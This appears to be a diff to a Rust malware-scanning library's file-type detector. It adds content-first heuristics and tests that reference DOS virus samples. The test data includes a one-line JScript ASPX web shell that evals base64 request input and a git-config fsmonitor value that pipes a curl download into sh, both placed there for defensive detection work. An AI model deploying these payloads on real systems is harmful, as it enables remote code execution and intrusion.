@@ -1,13 +1,16 @@
 //! Fast file format identification by magic bytes, shebangs, and extensions.
 //!
-//! `fileid` identifies file formats using a three-stage pipeline:
+//! `fileid` identifies file formats with a content-first pipeline:
 //!
-//! 1. **Content** — magic bytes and shebangs (first 256 bytes)
-//! 2. **Filename/Extension** — well-known names and extension mapping
-//! 3. **Heuristics** — lightweight pattern matching (first 2 KB, no tree-sitter)
+//! 1. **Signatures** — magic bytes and shebangs (first 256 bytes)
+//! 2. **Fast content heuristics** — lightweight patterns (first 2 KB, no tree-sitter)
+//! 3. **Filename and extension fallback** — used only when content checks do not
+//!    identify a stronger type
 //!
-//! Content is trusted first. Extension is a fallback. If neither yields a result,
-//! the file is unidentifiable and `detect` returns `None`.
+//! Strong content markers can override filename-only types, unknown extensions,
+//! weak extensions, and recognized polyglot/container disguises. Ordinary source
+//! extensions remain authoritative against ambiguous language-keyword matches.
+//! If no content rule or filename fallback yields a result, `detect` returns `None`.
 //!
 //! # Example
 //!
@@ -20,16 +23,15 @@
 //! ```
 
 pub mod container;
-mod doscom;
 mod ext;
 mod heuristics;
 mod magic;
 mod markdown;
+mod restructuredtext;
 mod scripts;
 pub(crate) mod shellcode;
 
 pub use container::{ArchiveFormat, Compression, Container, container_of};
-pub use doscom::{DecodedDosComPayload, DosComXorMethod, decode_dos_com_xor_payload};
 
 use std::path::Path;
 use stng::{RepeatingXorKey, recover_repeating_xor_pe};
@@ -754,7 +756,12 @@ impl FileType {
         )
     }
 
-    /// Returns true if this file type is an archive or compressed container.
+    /// Returns true if this file type is an archive or compressed container
+    /// whose members archive walkers can enumerate.
+    ///
+    /// This is narrower than the `"archive"` group: Flatpak bundles group as
+    /// archives for extension-mismatch purposes but stay opaque, because no
+    /// walker reads their OSTree delta framing yet.
     #[must_use]
     pub fn is_archive(&self) -> bool {
         matches!(
@@ -1368,6 +1375,11 @@ fn allows_heuristic_extension_override(file_type: FileType) -> bool {
         // recognises real source in there, the source wins and
         // `extension_mismatch` records the lie.
         FileType::Font
+            // A signatureless image extension cannot establish that the
+            // bytes are an image. Let strong source-language heuristics win;
+            // real JPEG/PNG magic has already returned in stage 1.
+            | FileType::Jpeg
+            | FileType::Png
             | FileType::Wav
             | FileType::Aiff
             | FileType::Mp3
@@ -1427,6 +1439,10 @@ fn mark_replaces(file_type: FileType) -> bool {
             | FileType::ObjectiveC
             | FileType::Lua
             | FileType::Clojure
+            // An image suffix names a container, but without its signature it
+            // should not overrule unmistakable text/source content.
+            | FileType::Jpeg
+            | FileType::Png
             | FileType::JavaScript
             | FileType::Python
             | FileType::Vbs
@@ -1526,26 +1542,39 @@ fn prose_extension_may_be_source(path: &Path) -> bool {
         || ext.eq_ignore_ascii_case("log")
 }
 
-/// True when a path's trailing dot-segment is a real extension rather than the
-/// tail of a version number.
+/// True when a path's trailing dot-segment is a named extension rather than
+/// a version number or the final component of a dotted executable name.
 ///
 /// `Path::extension` splits on the last dot, so `keyvault-keys@4.8.0` reports
 /// an extension of `"0"`, `react-redux@7.1.25` reports `"25"`, and `python3.11`
 /// reports `"11"`. Registry artifacts are routinely named this way — npm, crates
 /// and gem tarballs are stored as `<name>@<semver>` with no suffix at all.
 ///
-/// Treating those digits as an unrecognized extension made every one of them an
-/// extension/content mismatch: content detection identifies the gzip tar, the
-/// "extension" matches nothing, and the file is reported as `archive_as_unknown`
-/// — a masquerade signal on an ordinary package. A run of digits claims nothing
-/// about a file's format, so it is not something content can disagree with.
+/// An unregistered UpperCamelCase tail after a dotted stem is often a module
+/// or executable name, such as `org.example.MyModule` or `us.zoom.ZoomDaemon`,
+/// rather than a claim that the file has an unknown suffix. Known extensions
+/// are resolved separately and still take precedence.
 ///
-/// The `.so.1.1` case has its own handling in `ext::has_versioned_so_suffix`,
-/// which assigns the type; this only decides whether an extension was named.
+/// Treating version digits as unrecognized extensions made packages appear to
+/// mismatch their content. A run of digits claims nothing about a file's format,
+/// so it is not something content can disagree with. The `.so.1.1` case has its
+/// own handling in `ext::has_versioned_so_suffix`, which assigns the type.
 fn has_named_extension(path: &Path) -> bool {
-    path.extension()
-        .and_then(|e| e.to_str())
-        .is_some_and(|e| !e.is_empty() && !e.bytes().all(|b| b.is_ascii_digit()))
+    let Some(ext) = path.extension().and_then(|e| e.to_str()) else {
+        return false;
+    };
+    if ext.is_empty() || ext.bytes().all(|b| b.is_ascii_digit()) {
+        return false;
+    }
+    let dotted_camel_case_tail =
+        path.file_stem()
+            .and_then(|stem| stem.to_str())
+            .is_some_and(|stem| {
+                stem.contains('.')
+                    && ext.chars().next().is_some_and(|c| c.is_ascii_uppercase())
+                    && ext.chars().any(|c| c.is_ascii_lowercase())
+            });
+    !dotted_camel_case_tail
 }
 
 /// True for the specific formats that are *written in* YAML. Their `.yml` /
@@ -1747,7 +1776,39 @@ fn detect_known(path: &Path, data: &[u8]) -> Option<Detection> {
         });
     }
 
+    // A standalone FAT volume boot sector has no container magic. Identify its
+    // validated BPB before an opaque/unknown extension can leave it unscanned.
+    if heuristics::looks_like_fat_boot_sector(data) {
+        let ext_ft = ext::detect_from_path(path);
+        let ext_match = match ext_ft {
+            Some(FileType::Data) => ExtensionMatch::Consistent,
+            Some(e) => ExtensionMatch::Different(e),
+            None if has_named_extension(path) => ExtensionMatch::Unknown,
+            None => ExtensionMatch::Consistent,
+        };
+        return Some(Detection {
+            file_type: FileType::Data,
+            source: DetectionSource::Heuristic,
+            ext_match,
+        });
+    }
+
     let ext_ft = ext::detect_from_path(path);
+    // `.git/config` is normally extensionless. Its section/key structure is
+    // a strong content signature, and may correct even a misleading filename
+    // before source-language or exact-name fallbacks get a chance to win.
+    if heuristics::looks_like_git_config(data) {
+        return Some(Detection {
+            file_type: FileType::Text,
+            source: DetectionSource::Heuristic,
+            ext_match: match ext_ft {
+                Some(FileType::Text) => ExtensionMatch::Consistent,
+                Some(ext) => ExtensionMatch::Different(ext),
+                None if has_named_extension(path) => ExtensionMatch::Unknown,
+                None => ExtensionMatch::Consistent,
+            },
+        });
+    }
     let heuristic_may_override_ext = ext_ft.is_none_or(allows_heuristic_extension_override);
 
     // `.sc` is an Ammonite worksheet and also a vxheaven variant letter.
@@ -1806,6 +1867,22 @@ fn detect_known(path: &Path, data: &[u8]) -> Option<Detection> {
     // source extensions stay authoritative here: language keyword scoring is
     // too weak to override `.go`, `.js`, `.swift`, etc. A non-magic `.zip` body
     // may still be a script payload wearing an archive name.
+    // ReStructuredText documents often contain executable-looking examples.
+    // A sectioned document with directives or literal blocks is a document by
+    // its content, even when those examples happen to score as a source language.
+    if ext_ft == Some(FileType::Text)
+        && path
+            .extension()
+            .is_some_and(|ext| ext.eq_ignore_ascii_case("rst"))
+        && restructuredtext::document_structure(data)
+    {
+        return Some(Detection {
+            file_type: FileType::Text,
+            source: DetectionSource::Heuristic,
+            ext_match: ExtensionMatch::Consistent,
+        });
+    }
+
     // A document's fenced examples are not its execution language. Keep
     // content-first detection for scripts renamed .md; actual Markdown needs
     // both a leading heading and a complete fenced block before this applies.
@@ -2116,6 +2193,25 @@ mod tests {
         assert_detect(path, b"x = 1\n", expected);
     }
 
+    #[test]
+    fn shimmer_fat_boot_sector_is_recovered_as_analyzable_data() {
+        const SHIMMER: &[u8] = include_bytes!("../../testdata/dos-boot/shimmer-boot-sector.d");
+        let detection = detect(Path::new("Virus.Boot-DOS.Shimmer.d"), SHIMMER)
+            .expect("validated FAT boot sector should be identified");
+        assert_eq!(detection.file_type, FileType::Data);
+        assert_eq!(detection.source, DetectionSource::Heuristic);
+        assert_eq!(detection.ext_match, ExtensionMatch::Unknown);
+
+        // The boot signature on its own is not a file type. This preserves
+        // opaque handling for arbitrary 512-byte blobs that end in 55 AA.
+        let mut signature_only = [0x41u8; 512];
+        signature_only[510..].copy_from_slice(&[0x55, 0xAA]);
+        assert!(
+            detect(Path::new("opaque.d"), &signature_only)
+                .is_none_or(|d| d.file_type != FileType::Data)
+        );
+    }
+
     // ── Binary formats (magic bytes) ─────────────────────────────────
 
     #[test]
@@ -2175,11 +2271,60 @@ mod tests {
         assert!(det.extension_mismatch());
     }
 
+    #[test]
+    fn macho_dotted_camel_case_executable_name_is_not_an_unknown_extension() {
+        let data = [0xCF, 0xFA, 0xED, 0xFE, 0, 0, 0, 0];
+        let det = detect(Path::new("us.zoom.ZoomDaemon"), &data).unwrap();
+        assert_eq!(det.file_type, FileType::MachO);
+        assert!(!det.extension_mismatch());
+        assert_eq!(det.extension_type(), None);
+    }
+
+    #[test]
+    fn dotted_camel_case_script_module_name_is_not_an_unknown_extension() {
+        let source = b"#!/usr/bin/env python3\nprint('ok')\n";
+        let det = detect(Path::new("org.example.MyModule"), source).unwrap();
+        assert_eq!(det.file_type, FileType::Python);
+        assert!(!det.extension_mismatch());
+        assert_eq!(det.extension_type(), None);
+    }
+
+    #[test]
+    fn macho_db_suffix_is_a_typed_data_extension_mismatch() {
+        let data = [0xCF, 0xFA, 0xED, 0xFE, 0, 0, 0, 0];
+        let id = FileId::from_path_and_bytes(Path::new("libpayload.db"), &data);
+        assert_eq!(id.file_type(), FileType::MachO);
+        assert!(id.extension_mismatch());
+        assert_eq!(id.extension_mismatch_transition(), Some(("binary", "data")));
+    }
+
     // ── AppleDouble (._<name>) resource forks ────────────────────────────
     // Regression guard: a benign Composer tarball lit up at suspicious
     // because cleave classified macOS resource forks (`._foo.php`) as PHP
     // and then ran obfuscation traits over their binary bodies. Magic-byte
     // detection must return Unknown so `is_program()` skips analysis.
+
+    #[test]
+    fn go_mod_content_beats_unknown_and_misleading_extensions() {
+        let data = b"module shell_reverse_tcp\n\ngo 1.23.4\n";
+
+        let canonical = detect(Path::new("go.mod"), data).expect("canonical Go module name");
+        assert_eq!(canonical.file_type, FileType::GoMod);
+        assert_eq!(canonical.source, DetectionSource::Filename);
+        assert!(!canonical.extension_mismatch());
+
+        let renamed = detect(Path::new("go.5095a2ce.mod"), data)
+            .expect("Go module content should be identified without a canonical name");
+        assert_eq!(renamed.file_type, FileType::GoMod);
+        assert_eq!(renamed.source, DetectionSource::Heuristic);
+        assert!(renamed.extension_mismatch());
+
+        let misleading = detect(Path::new("not-a-manifest.js"), data)
+            .expect("strong manifest content should beat a source extension");
+        assert_eq!(misleading.file_type, FileType::GoMod);
+        assert_eq!(misleading.source, DetectionSource::Heuristic);
+        assert!(misleading.extension_mismatch());
+    }
 
     #[test]
     fn appledouble_magic_returns_unknown() {
@@ -2701,6 +2846,16 @@ function loadBytenode(){return require('bytenode');}\n})();\n";
         let aspx = b"<%@ Page Language=\"C#\" %>\n<script runat=\"server\">\n</script>\n";
         assert_detect("shell.aspx", aspx, FileType::Asp);
         assert_detect("renamed.txt", aspx, FileType::Asp);
+        let jscript_aspx = b"<%@Page Language=\"Jscript\"%>\n<%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item['x'])));%>\n";
+        assert_detect("shell.aspx", jscript_aspx, FileType::Asp);
+        assert_detect("payload.unknown", jscript_aspx, FileType::Asp);
+    }
+
+    #[test]
+    fn ace_jsp_snippets_are_javascript_not_jsp() {
+        let snippets = b"define(\"ace/snippets/jsp\",[\"require\",\"exports\",\"module\"],function(require,exports,module){\nexports.snippetText = \"<%@page contentType=\\\"text/html\\\"%>\\n\";\n});\n";
+        assert_detect("jsp.js", snippets, FileType::JavaScript);
+        assert_detect("snippet.unknown", snippets, FileType::JavaScript);
     }
 
     #[test]
@@ -2800,6 +2955,27 @@ Coordinate with the Applet Maintainer before sweeping changes.\n";
         assert_detect("prog.bin", &com, FileType::DosCom);
     }
 
+    #[test]
+    fn padded_anton_overwriter_is_recovered_as_dos_com() {
+        const ANTON: &[u8] = include_bytes!("../../testdata/dos-com/anton-97");
+        let detection = detect(Path::new("Virus.DOS.Trivial.Anton.97"), ANTON)
+            .expect("DOS overwriter execution shape should identify the opaque sample");
+        assert_eq!(detection.file_type, FileType::DosCom);
+        assert_eq!(detection.source, DetectionSource::Heuristic);
+        assert_eq!(detection.ext_match, ExtensionMatch::Consistent);
+
+        // A lone interrupt and a COM-like string are too weak without the
+        // repeated DOS-call and termination shape.
+        let mut ordinary_data = vec![0u8; 5120];
+        ordinary_data[..6].copy_from_slice(b"*.COM\0");
+        ordinary_data[16..18].copy_from_slice(&[0xCD, 0x21]);
+        ordinary_data[32..34].copy_from_slice(&[0xCD, 0x20]);
+        assert!(
+            detect(Path::new("opaque.97"), &ordinary_data)
+                .is_none_or(|d| d.file_type != FileType::DosCom)
+        );
+    }
+
     /// Opaque bytes after a call/pop GetPC stub: the shape of a carved,
     /// encoded stage. Unknown before, so no rule could reach it.
     fn call_pop_blob() -> Vec<u8> {
@@ -2893,6 +3069,22 @@ Coordinate with the Applet Maintainer before sweeping changes.\n";
         );
     }
 
+    /// A short NOP prefix before an XOR-encoded PE still exposes the image
+    /// through the normal FileId recovery path.
+    #[test]
+    fn prefixed_xor_encoded_pe_is_data_and_keeps_image_offset() {
+        let pe = include_bytes!("../../tests/fixtures/test.exe");
+        let mut plain = vec![0x90; 8];
+        plain.extend_from_slice(pe);
+        let enc: Vec<u8> = plain.iter().map(|b| b ^ 0x23).collect();
+        let id = FileId::from_path_and_bytes(Path::new("payload"), &enc);
+        assert_eq!(id.file_type(), FileType::Data);
+        let key = id.xor_pe_key().expect("recover prefixed XOR PE");
+        assert_eq!(key.bytes(), &[0x23]);
+        assert_eq!(key.pe_offset(), 8);
+        assert_eq!(key.decode(&enc), plain);
+    }
+
     /// Size alone is not enough: a small binary with no `INT 21h` near the
     /// front stays what it was, so an arbitrary short blob is not a program.
     #[test]
@@ -2910,12 +3102,18 @@ Coordinate with the Applet Maintainer before sweeping changes.\n";
     /// how a ciphertext or firmware blob with a chance `CD 21` stays data.
     #[test]
     fn oversized_blob_with_int21_is_not_dos_com() {
-        let mut blob = vec![0x01u8; doscom::DOS_COM_MAX_SIZE + 1];
+        let mut blob = vec![0x01u8; heuristics::DOS_COM_MAX_SIZE + 1];
         blob[11] = 0xCD;
         blob[12] = 0x21;
         assert_detect("prog.bin", &blob, FileType::Data);
         let det = detect(Path::new("prog"), &blob);
         assert!(det.is_none_or(|d| d.file_type != FileType::DosCom));
+    }
+
+    #[test]
+    fn nostardamus_self_modifying_xor_entry_is_dos_com() {
+        const SAMPLE: &[u8] = include_bytes!("../../testdata/dos-com/nostardamus-1870");
+        assert_detect("nostardamus", SAMPLE, FileType::DosCom);
     }
 
     #[test]
@@ -3377,6 +3575,12 @@ Coordinate with the Applet Maintainer before sweeping changes.\n";
     }
 
     #[test]
+    fn flatpak_groups_as_archive_but_is_not_walkable() {
+        assert_eq!(file_group(FileType::Flatpak), "archive");
+        assert!(!FileType::Flatpak.is_archive());
+    }
+
+    #[test]
     fn is_archive_returns_true_for_archives() {
         assert!(FileType::Zip.is_archive());
         assert!(FileType::TarGz.is_archive());
@@ -3786,7 +3990,60 @@ function wpcf7_special_mail_tag( $output, $name, $html ) {
         assert_detect("Makefile", b"all:\n\techo hi\n", FileType::Makefile);
         assert_detect("Makefile.debug", b"all:\n\techo hi\n", FileType::Makefile);
         assert_detect("rules.mk", b"all:\n\techo hi\n", FileType::Makefile);
-        assert!(detect(Path::new("buildfile"), b"all:\n\techo hi\n").is_none());
+        assert_detect("buildfile", b"all:\n\techo hi\n", FileType::Makefile);
+        assert!(
+            detect(
+                Path::new("buildfile"),
+                b"This is a note:\n  run make later.\n"
+            )
+            .is_none(),
+            "prose mentioning make should not look like a build file"
+        );
+    }
+
+    #[test]
+    fn makefile_content_overrides_signatureless_image_extensions() {
+        let body = b"JPEG_INC ?= $(shell pkg-config --cflags libjpeg || echo)\nJPEG_LIB ?= $(shell pkg-config --libs libjpeg || echo -ljpeg)\n";
+        for path in ["util/makefile.jpeg", "util/makefile.png"] {
+            let detected = detect(Path::new(path), body).expect("make syntax is content evidence");
+            assert_eq!(detected.file_type, FileType::Makefile, "{path}");
+            assert_eq!(detected.source, DetectionSource::Heuristic, "{path}");
+            assert!(detected.extension_mismatch(), "{path}");
+            assert!(detected.extension_type().is_some(), "{path}");
+        }
+    }
+
+    #[test]
+    fn makefile_content_does_not_override_a_valid_jpeg_signature() {
+        let image = b"\xFF\xD8\xFF\xE0JPEG_INC ?= $(shell pkg-config --cflags libjpeg)\n";
+        let detected = detect(Path::new("photo.jpeg"), image).expect("JPEG signature");
+        assert_eq!(detected.file_type, FileType::Jpeg);
+        assert_eq!(detected.source, DetectionSource::Magic);
+    }
+
+    #[test]
+    fn javascript_comment_and_indented_code_do_not_look_like_makefile() {
+        const BALALA: &[u8] = include_bytes!("../../testdata/vbs/balala-wrapper.sample");
+        let detected = detect(Path::new("payload.sample"), BALALA)
+            .expect("embedded JavaScript wrapper should be identified");
+        assert_eq!(detected.file_type, FileType::JavaScript);
+
+        let source = b"function f() {\n\t//post: explanation\n\tcall();\n}\n";
+        assert!(
+            detect(Path::new("source.unknown"), source)
+                .is_none_or(|d| d.file_type != FileType::Makefile)
+        );
+    }
+
+    #[test]
+    fn strong_source_heuristics_override_signatureless_image_extensions() {
+        let python = b"import os\nimport subprocess\ndef run():\n    subprocess.call(['tool'])\n";
+        for path in ["payload.jpeg", "payload.png"] {
+            let detected = detect(Path::new(path), python).expect("Python content");
+            assert_eq!(detected.file_type, FileType::Python, "{path}");
+            assert_eq!(detected.source, DetectionSource::Heuristic, "{path}");
+            assert!(detected.extension_mismatch(), "{path}");
+        }
     }
 
     // ── Skip / non-match ─────────────────────────────────────────────
@@ -4053,6 +4310,29 @@ function wpcf7_special_mail_tag( $output, $name, $html ) {
 
     // ── Content-first detection beats extension-only fallback ────────
 
+    #[test]
+    fn roff_man_page_content_beats_source_language_heuristics() {
+        let man_page = b".de EX\n.nf\n.ft CW\n..\n.de EE\n.br\n.fi\n.ft 1\n..\n\
+.TH AWK 1\n.SH NAME\n.B awk\n- pattern-directed scanning and processing language\n\
+.SH DESCRIPTION\n.PP\n.I Awk\n scans each input file.\n.TP\n.B -F fs\n";
+
+        for path in ["awk.1", "renamed.js"] {
+            let detection = detect(Path::new(path), man_page)
+                .expect("recognizable roff manual should be identified");
+            assert_eq!(detection.file_type, FileType::Text, "{path}");
+            assert_eq!(detection.source, DetectionSource::Heuristic, "{path}");
+            assert!(!detection.file_type.is_source_code(), "{path}");
+        }
+
+        let javascript = b"const total = 1;\nfunction add(value) { return total + value; }\n";
+        assert_detect("example.js", javascript, FileType::JavaScript);
+
+        // A lone troff-looking request is common in examples and is not a
+        // document signature by itself.
+        let example = b".TH is shown as a command example\nconst total = 1;\n";
+        assert_detect("example.js", example, FileType::JavaScript);
+    }
+
     /// Real-world polyglot: a `.zip` file whose first KB is a VBScript
     /// payload (CHM/EOCD-comment dropper). Trusting the `.zip` extension
     /// would route to the ZIP analyzer and fail outright; the heuristic
@@ -4085,6 +4365,59 @@ function wpcf7_special_mail_tag( $output, $name, $html ) {
         assert_eq!(det.file_type, FileType::Vbs);
         assert_eq!(det.source, DetectionSource::Heuristic);
         assert!(det.extension_mismatch());
+    }
+
+    #[test]
+    fn git_config_content_identifies_extensionless_and_misnamed_files() {
+        let config = b"[core]\n\
+            repositoryformatversion = 0\n\
+            filemode = true\n\
+            [remote \"origin\"]\n\
+            url = https://example.invalid/project.git\n\
+            fetch = +refs/heads/*:refs/remotes/origin/*\n";
+
+        let detection = detect(Path::new("/repo/.git/config"), config)
+            .expect("Git config content must identify extensionless .git/config");
+        assert_eq!(detection.file_type, FileType::Text);
+        assert_eq!(detection.source, DetectionSource::Heuristic);
+        assert_eq!(detection.ext_match, ExtensionMatch::Consistent);
+
+        let misnamed = detect(Path::new("Makefile"), config)
+            .expect("Git config content must beat an exact filename match");
+        assert_eq!(misnamed.file_type, FileType::Text);
+        assert_eq!(misnamed.source, DetectionSource::Heuristic);
+        assert!(misnamed.extension_mismatch());
+
+        // A malicious one-key core setting is still enough to identify the
+        // config file, so rules can analyze its command value.
+        let trigger = b"[core]\nfsmonitor = curl https://example.invalid/a | sh\n";
+        assert_eq!(
+            detect(Path::new("/repo/.git/config"), trigger)
+                .expect("a Git fsmonitor setting is a config signature")
+                .file_type,
+            FileType::Text
+        );
+    }
+
+    #[test]
+    fn git_config_heuristic_rejects_source_assignments_and_generic_ini() {
+        let parser_variable = b"clean = re.sub(\"pattern\", \"\", raw)\n";
+        assert_eq!(
+            detect(Path::new("parser.py"), parser_variable)
+                .expect("the source extension identifies Python")
+                .file_type,
+            FileType::Python
+        );
+
+        let process_variable = b"process = processes_mapping[pid]\n";
+        assert_eq!(
+            detect(Path::new("ps.py"), process_variable)
+                .expect("the source extension identifies Python")
+                .file_type,
+            FileType::Python
+        );
+
+        assert!(detect(Path::new("config"), b"[core]\nversion = 2\n").is_none());
     }
 
     #[test]
